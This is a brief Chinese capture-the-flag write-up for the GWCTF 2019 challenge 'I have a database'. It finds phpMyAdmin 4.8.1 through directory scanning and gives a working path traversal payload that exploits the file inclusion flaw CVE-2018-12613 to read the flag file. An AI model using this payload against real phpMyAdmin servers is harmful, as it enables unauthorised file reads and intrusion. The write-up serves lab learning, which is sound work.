# [GWCTF 2019]我有一个数据库

## Tag

PHPMyAdmin+CVE

***

## Writeup

Dirsearch 有 PHPMyAdmin，版本为 4.8.1，查询可得有文件包含漏洞（CVE-2018-12613），Payload 为 `?target=db_sql.php%253f/../../../../../../../../flag`：

![image-20260215142016468](../../../../assets/image-20260215142016468.png)
